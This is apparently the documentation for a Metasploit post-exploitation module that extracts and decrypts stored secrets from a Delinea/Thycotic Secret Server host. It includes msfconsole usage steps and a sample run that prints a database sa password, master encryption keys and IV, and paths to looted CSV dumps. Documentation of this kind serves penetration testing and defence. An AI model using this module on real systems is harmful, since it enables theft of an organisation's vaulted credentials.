This module exports and decrypts Secret Server credentials to a CSV file; it is intended as a
post-exploitation module for Windows hosts with Delia/Thycotic Secret Server installed. Master
Encryption Key (MEK) and associated IV values are decrypted from `encryption.config` using a 
static key baked into the software. The module also supports parameter recovery for encryption
configs configured with Windows DPAPI. An optional parameter "LOOT_ONLY" allows the encryption
keys and encrypted database to be plundered for later offline decryption in situations where
expedience is necessary.

This module incorporates original research published by the authors of SecretServerSecretStealer,
a PowerShell script designed to harvest Secret Server credentials. The GitHub repo for
SecretStealer.ps1 includes tons of notes on the internals of Secret Server:

https://github.com/denandz/SecretServerSecretStealer

## Vulnerable Application
This module should have no problem decrypting the database for versions 10.4 through 11.2, though
it has only been tested against a system running version 11.2.  It is intended to be run after
successfully exploiting a Windows host with the Delia/Thycotic Secret Server software installed.
The module supports decryption of configuration files that have been protected by Windows DPAPI,
but does not support extraction of any secrets if the system is configured with a Hardware Security
Module (HSM).

## Verification Steps
This is a post module and requires a meterpreter session on the Microsoft Windows server host
with a configured instance of Delia/Thycotic Secret Server installed.

1. Start msfconsole
2. Get session on Secret Server host via method of choice and background it
3. Do: `use post/windows/gather/credentials/thycotic_secretserver_dump`
4. Do: `set session <session>`
5. Do: `dump`

## Options

### SESSION

Which session to use, which can be viewed with `sessions -l`

### LOOT_ONLY

Boolean value that determines whether the module terminates after extracting the elements required
to perform the decryption. If set to `true`, the module terminates after the MEK and database have
been added to loot; if set to `false`, the module will perform decryption of the database using
the extracted MEK values and add the resulting decrypted data to loot. This is a useful option to
enable where rapid exfiltration is desirable. 

## Scenarios
Example run from meterpreter session on a Windows Server 2019 host running Secret Server 11.2:

```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/thycotic_secretserver_dump
msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > set session 1
session => 1
msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > show options

Module options (post/windows/gather/credentials/thycotic_secretserver_dump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   LOOT_ONLY  false            no        Only loot the encryption keys and database dump for offline decryption
   SESSION    1                yes       The session to run this module on


Post action:

   Name  Description
   ----  -----------
   Dump  Dump Secret Server


msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > dump

[*] Validating target ...
[*] Hostname THYCOTIC IPv4 10.1.0.113
[*] Decrypt database.config ...
[+] Secret Server SQL Database Connection Configuration:
[+]     Instance Name: localhost\SQLEXPRESS
[+]     Database Name: SecretServer
[+]     Database User: sa
[+]     Database Pass: !-TUwX!_-gD-wak-cugyU-0GX0$vL-evYG2
[*] Decrypt encryption.config ...
[+] Secret Server Encryption Configuration:
[+]        KEY: fc35d1abcade1c180c699e10fbb3efeb
[+]     KEY256: e768c5223bafa5481faca1ee10b63fb80c699e10ffa694ce29adc66963d05109
[+]         IV: 2c2df1a68dbc29adc66041bd6e6e4ad3
[*] Init SQL client ...
[+] Found SQL client: sqlcmd
[*] Dump Secret Server DB ...
[+] 47842 rows loaded, 19915 unique SecretIDs
[+] Encrypted Secret Server Database Dump: /root/.msf4/loot/20220822090512_default_10.1.0.113_ss_enc_947808.csv
[*] Process Secret Server DB ...
[!] SecretID 4092 field SFTP Site contains invalid UTF-8 and will be stored as a Base64 string in the output file
[!] SecretID 11097 field Notes contains invalid UTF-8 and will be stored as a Base64 string in the output file
[-] SecretID 11319 field Notes failed to decrypt
[!] 47842 rows processed (1 rows failed)
[*] 47841 rows recovered: 34479 plaintext, 13336 decrypted (2699 blank)
[*] 45142 rows written (2699 blank rows withheld)
[+] 19836 unique SecretID records recovered
[+] Decrypted Secret Server Database Dump: /root/.msf4/loot/20220822090532_default_10.1.0.113_ss_dec_402297.csv
[*] Post module execution completed
msf6 post(multi/gather/thycotic_secretserver_dump) > 
```